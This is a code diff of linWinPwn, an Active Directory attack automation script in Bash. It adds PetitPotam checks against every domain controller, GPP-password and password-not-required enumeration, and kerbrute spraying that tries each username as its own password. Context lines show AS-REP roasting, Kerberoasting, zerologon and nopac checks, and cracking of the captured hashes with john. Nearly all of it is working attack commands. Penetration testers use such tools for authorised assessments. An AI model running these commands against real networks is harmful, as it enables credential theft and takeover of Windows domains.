@@ -3,7 +3,7 @@
 # linWinPwn - alpha version (https://github.com/lefayjey/linWinPwn)
 # Author: lefayjey
 # Inspired by: S3cur3Th1sSh1t's WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
-# Latest update : 31/01/2022
+# Latest update : 01/02/2022
 #
 #      _        __        ___       ____                 
 #     | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __  
@@ -166,10 +166,10 @@ prepare (){
     echo -e "${YELLOW}[i]${NC} Running modules: ${modules}"
     echo -e ""
 
-    output_dir="${output_dir}/linWinPwn_$(date +%Y-%m-%dT%T)"
+    output_dir="${output_dir}/linWinPwn_$(date +%Y%m%d%H%M%S)"
     mkdir -p ${output_dir}/DomainRecon/BloodHound
     mkdir -p ${output_dir}/DomainRecon/LDAPDump
-    mkdir -p ${output_dir}/Kerberoast
+    mkdir -p ${output_dir}/Kerberos
     mkdir -p ${output_dir}/Credentials
     mkdir -p ${output_dir}/Scans/SMBDump
 }
@@ -211,7 +211,9 @@ dns_enum () {
 
     sort -u ${servers_ip_list} > ${output_dir}/DomainRecon/ip_list_sorted_${dc_domain}.txt
     mv ${output_dir}/DomainRecon/ip_list_sorted_${dc_domain}.txt ${servers_ip_list}
-    
+    echo ${dc_ip} >> ${dc_ip_list}
+    sort -u ${dc_ip_list} > ${output_dir}/DomainRecon/ip_list_dc_sorted_${dc_domain}.txt
+    mv ${output_dir}/DomainRecon/ip_list_dc_sorted_${dc_domain}.txt ${dc_ip_list}
     echo -e ""
 }
 
@@ -363,8 +365,10 @@ ad_enum () {
             echo -e "${CYAN}[*] spooler check ${NC}"
             ${crackmapexec} smb ${dc_ip_list} -u '' -p '' -M spooler | tee ${output_dir}/DomainRecon/cme_spooler_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] petitpotam check ${NC}"
-            ${crackmapexec} smb ${dc_ip} -u '' -p '' -M petitpotam | tee ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
-            echo -e "${CYAN}[*] zerologon check ${NC}"
+            for i in $(/bin/cat ${dc_ip_list}); do
+                ${crackmapexec} smb ${i} -u '' -p '' -M petitpotam | tee -a ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
+            done
+            echo -e "${CYAN}[*] zerologon check. This may take a while... ${NC}"
             ${crackmapexec} smb ${dc_ip} -u '' -p '' -M zerologon | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] mssql_priv check ${NC}"
             ${crackmapexec} mssql ${sql_ip_list} -u '' -p '' -M mssql_priv | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
@@ -376,15 +380,24 @@ ad_enum () {
             echo -e "${CYAN}[*] nopac check ${NC}"
             ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -H ${hash} -M nopac | tee ${output_dir}/DomainRecon/cme_nopac_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] petitpotam check ${NC}"
-            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M petitpotam | tee ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
-            echo -e "${CYAN}[*] zerologon check ${NC}"
+            for i in $(/bin/cat ${dc_ip_list}); do
+                ${crackmapexec} smb ${i} -d ${domain} -u ${user} -H ${hash} -M petitpotam | tee -a ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
+            done
+            echo -e "${CYAN}[*] Password Policy enum ${NC}"
+            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -H ${hash} --pass-pol | tee ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
+            echo -e "${CYAN}[*] GPP checks ${NC}"
+            ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -H ${hash} -M gpp_autologin | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -H ${hash} -M gpp_password | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
+            echo -e "${CYAN}[*] zerologon check. This may take a while... ${NC}"
             ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M zerologon | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
+            echo -e "${CYAN}[*] Password not required enum ${NC}"
+            ${crackmapexec} ldap ${dc_ip_list} -d ${domain} -u ${user} -H ${hash} --password-not-required | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] laps dump ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M laps --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] adcs check ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M adcs --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_adcs_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] users description dump ${NC}"
-            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M get-desc-users --kdcHost ${dc_domain} | grep -i "pass" | tee ${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M get-desc-users --kdcHost ${dc_domain} | grep -i "pass" | tee ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] get MachineAccountQuota ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M MAQ --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] ldap-signing check ${NC}"
@@ -399,15 +412,24 @@ ad_enum () {
             echo -e "${CYAN}[*] nopac check ${NC}"
             ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -p '' -k -M nopac | tee ${output_dir}/DomainRecon/cme_nopac_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] petitpotam check ${NC}"
-            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p '' -k -M petitpotam | tee ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
-            echo -e "${CYAN}[*] zerologon check ${NC}"
+            for i in $(/bin/cat ${dc_ip_list}); do
+                ${crackmapexec} smb ${i} -d ${domain} -u ${user} -p '' -k -M petitpotam | tee -a ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
+            done
+            echo -e "${CYAN}[*] Password Policy enum ${NC}"
+            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p '' -k --pass-pol | tee ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
+            echo -e "${CYAN}[*] GPP checks ${NC}"
+            ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -p '' -k -M gpp_autologin | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -p '' -k -M gpp_password | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
+            echo -e "${CYAN}[*] zerologon check. This may take a while... ${NC}"
             ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p '' -k -M zerologon | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
+            echo -e "${CYAN}[*] Password not required enum ${NC}"
+            ${crackmapexec} ldap ${dc_ip_list} -d ${domain} -u ${user} -p '' -k --password-not-required | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] laps dump ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M laps --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] adcs check ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M adcs --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_adcs_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] users description dump ${NC}"
-            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M get-desc-users --kdcHost ${dc_domain} | grep -i "pass" | tee${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M get-desc-users --kdcHost ${dc_domain} | grep -i "pass" | tee${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] get MachineAccountQuota ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M MAQ --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] ldap-signing check ${NC}"
@@ -422,15 +444,24 @@ ad_enum () {
             echo -e "${CYAN}[*] nopac check ${NC}"
             ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -p ${password} -M nopac | tee ${output_dir}/DomainRecon/cme_nopac_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] petitpotam check ${NC}"
-            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p ${password} -M petitpotam | tee ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
-            echo -e "${CYAN}[*] zerologon check ${NC}"
+            for i in $(/bin/cat ${dc_ip_list}); do
+                ${crackmapexec} smb ${i} -d ${domain} -u ${user} -p ${password} -M petitpotam | tee -a ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
+            done
+            echo -e "${CYAN}[*] Password Policy enum ${NC}"
+            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p ${password} --pass-pol | tee ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
+            echo -e "${CYAN}[*] GPP checks ${NC}"
+            ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -p ${password} -M gpp_autologin | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -p ${password} -M gpp_password | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
+            echo -e "${CYAN}[*] zerologon check. This may take a while... ${NC}"
             ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p ${password} -M zerologon | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
-            echo -e "${CYAN}[*] laps dump ${NC}"
+            echo -e "${CYAN}[*] Password not required enum ${NC}"
+            ${crackmapexec} ldap ${dc_ip_list} -d ${domain} -u ${user} -p ${password} --password-not-required | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
+             echo -e "${CYAN}[*] laps dump ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M laps --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] adcs check ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M adcs --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_adcs_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] users description dump ${NC}"
-            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M get-desc-users --kdcHost ${dc_domain} | grep -i "pass" | tee ${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M get-desc-users --kdcHost ${dc_domain} | grep -i "pass" | tee ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] get MachineAccountQuota ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M MAQ --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] ldap-signing check ${NC}"
@@ -442,19 +473,16 @@ ad_enum () {
     echo -e ""
 
     echo -e "${BLUE}[*] impacket enum${NC}"
-    if [[ ! -f "${impacket_dir}/findDelegation.py" ]] && [[ ! -f "${impacket_dir}/Get-GPPPassword.py)" ]] ; then
+    if [ ! -f "${impacket_dir}/findDelegation.py" ] ; then
         echo -e "${RED}[-] Please verify the installation of impacket${NC}"
     else
         if [ "${anon_bool}" == true ] ; then
             echo -e "${PURPLE}[-] impacket requires credentials${NC}"
         elif [ "${hash_bool}" == true ] ; then 
-            ${python} ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}@${dc_ip} -hashes ${hash} | tee ${output_dir}/DomainRecon/impacket_Get-GPPPassword_output_${dc_domain}.txt
             ${python} ${impacket_dir}/findDelegation.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
         elif [ "${kerb_bool}" == true ] ; then
-            ${python} ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}@${dc_ip} -k -no-pass | tee ${output_dir}/DomainRecon/impacket_Get-GPPPassword_output_${dc_domain}.txt
             ${python} ${impacket_dir}/findDelegation.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
         else
-            ${python} ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}:${password}@${dc_ip} | tee ${output_dir}/DomainRecon/impacket_Get-GPPPassword_output_${dc_domain}.txt
             ${python} ${impacket_dir}/findDelegation.py ${domain}/${user}:${password} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
         fi
         if [ "${anon_bool}" == false ] ; then
@@ -523,43 +551,52 @@ ad_enum () {
 }
 
 kerberos () {
-    echo -e "${BLUE}[*] kerbrute Usernames${NC}"
+    
+    known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
+    /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
+
+    echo -e "${BLUE}[*] kerbrute enumeration${NC}"
     if [ ! -f "${kerbrute}" ] ; then
         echo -e "${RED}[-] Please verify the installation of kerbrute${NC}"
     else
-        if [ "${anon_bool}" == true ] ; then
-            echo -e "${YELLOW}[i] Using $users_list wordlist for user enumeration${NC}"
-            ${kerbrute} -users ${users_list} -domain ${dc_domain} -dc-ip ${dc_ip} -no-save-ticket -outputusers ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt | tee ${output_dir}/Kerberoast/kerbrute_output_${dc_domain}.txt 2>&1
+        if [ ! -s "${known_users_list}" ] ; then
+            echo -e "${YELLOW}[i] Using $users_list wordlist for user enumeration. This may take a while...${NC}"
+            ${kerbrute} -users ${users_list} -domain ${dc_domain} -dc-ip ${dc_ip} -no-save-ticket -threads 5 -outputusers ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt | tee ${output_dir}/Kerberos/kerbrute_user_output_${dc_domain}.txt 2>&1
+        else
+            echo -e "${YELLOW}[i] Password = username check using kerbrute. This may take a while...${NC}"
+            for i in $(/bin/cat ${known_users_list}); do
+                ${kerbrute} -user ${i} -password ${i} -domain ${dc_domain} -dc-ip ${dc_ip} -no-save-ticket -threads 5 -outputfile ${output_dir}/DomainRecon/user_eq_pass_valid_${dc_domain}.txt | grep -v "Impacket" | tee -a ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1
+            done
         fi
     fi
     echo -e ""
-    
+
+    /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
+
     echo -e "${BLUE}[*] AS REP Roasting Attack${NC}"
     if [ ! -f "${impacket_dir}/GetNPUsers.py" ] ; then
         echo -e "${RED}[-] Please verify the installation of impacket${NC}"
     else
         if [[ "${dc_domain}" != "${domain}" ]] || [ "${anon_bool}" == true ] ; then
-            known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
-            /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf | tee ${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt 2>&1
             if [ -s "${known_users_list}" ] ; then
                 users_list=${known_users_list}
             fi
-            ${python} ${impacket_dir}/GetNPUsers.py ${dc_domain}/ -usersfile ${users_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt 2>&1
+            ${python} ${impacket_dir}/GetNPUsers.py ${dc_domain}/ -usersfile ${users_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
         elif [ "${hash_bool}" == true ] ; then
             ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip}
-            ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
         elif [ "${kerb_bool}" == true ] ; then
             ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip}
-            ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
         else
             ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user}:${password} -dc-ip ${dc_ip}
-            ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user}:${password} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user}:${password} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
         fi
 
-        if grep -q 'error' ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt; then
+        if grep -q 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt; then
             echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
         else
-            /bin/cat ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberoast/asreproast_hashes_${dc_domain}.txt 2>&1
+            /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
         fi
     fi
     echo -e ""
@@ -572,19 +609,19 @@ kerberos () {
             echo -e "${PURPLE}[-] Kerberoast requires credentials${NC}"
         elif [ "${hash_bool}" == true ] ; then
             ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip} -target-domain ${dc_domain}
-            ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
         elif [ "${kerb_bool}" == true ] ; then
             ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip} -target-domain ${dc_domain}
-            ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
         else
             ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user}:${password} -dc-ip ${dc_ip} -target-domain ${dc_domain}
-            ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user}:${password} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user}:${password} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
         fi
         if [ "${anon_bool}" == false ] ; then
-            if grep -q 'error' ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt; then
+            if grep -q 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt; then
                 echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
             else
-                /bin/cat ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' > ${output_dir}/Kerberoast/kerberoast_hashes_${dc_domain}.txt
+                /bin/cat ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' > ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
             fi
         fi
     fi
@@ -594,26 +631,26 @@ kerberos () {
     if [ ! -f "${john}" ] ; then
         echo -e "${RED}[-] Please verify the installation of john${NC}"
     else
-        echo -e "${CYAN}[*] Launching john on collected kerberoast hashes...${NC}"
+        echo -e "${CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...${NC}"
 
-        if [ ! -s ${output_dir}/Kerberoast/kerberoast_hashes_${dc_domain}.txt ]; then
+        if [ ! -s ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt ]; then
             echo -e "${PURPLE}[-] No SPN accounts found${NC}"
         else
             echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
-            $john ${output_dir}/Kerberoast/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_list
+            $john ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_list
             echo -e "${GREEN}[+] Printing cracked Kerberoast hashes...${NC}"
-            $john ${output_dir}/Kerberoast/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show | tee ${output_dir}/Kerberoast/kerberoast_john_results_${dc_domain}.txt
+            $john ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show | tee ${output_dir}/Kerberos/kerberoast_john_results_${dc_domain}.txt
         fi
 
-        echo -e "${CYAN}[*] Launching john on collected asreproast hashes...${NC}"
+        echo -e "${CYAN}[*] Launching john on collected asreproast hashes. This may take a while...${NC}"
 
-        if [ ! -s ${output_dir}/Kerberoast/asreproast_hashes_${dc_domain}.txt ]; then
+        if [ ! -s ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt ]; then
             echo -e "${PURPLE}[-] No accounts with Kerberos preauth disabled found${NC}"
         else
             echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
-            $john ${output_dir}/Kerberoast/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_list
+            $john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_list
             echo -e "${GREEN}[+] Printing cracked AS REP Roast hashes...${NC}"
-            $john ${output_dir}/Kerberoast/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show | tee ${output_dir}/Kerberoast/asreproast_john_results_${dc_domain}.txt
+            $john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show | tee ${output_dir}/Kerberos/asreproast_john_results_${dc_domain}.txt
         fi
     fi
     echo -e ""
